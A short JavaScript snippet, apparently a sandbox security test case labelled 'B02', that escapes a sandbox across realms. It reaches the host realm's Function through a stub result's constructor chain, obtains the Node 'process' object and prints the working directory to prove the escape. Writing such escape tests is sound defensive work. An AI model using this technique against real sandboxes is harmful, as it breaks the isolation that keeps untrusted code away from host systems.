// Category: cross-realm escape via a granted-symbol stub result object.
// Stub return values are built by HOST closures, so their prototype chain
// reaches the host realm Object/Function constructors.
const stubResult = computeTotal([{ priceCents: 1 }]);
const HostFunction = stubResult.constructor.constructor;
const hostProcess = HostFunction("return process")();
console.log("B02-ESCAPED cwd:", hostProcess.cwd());
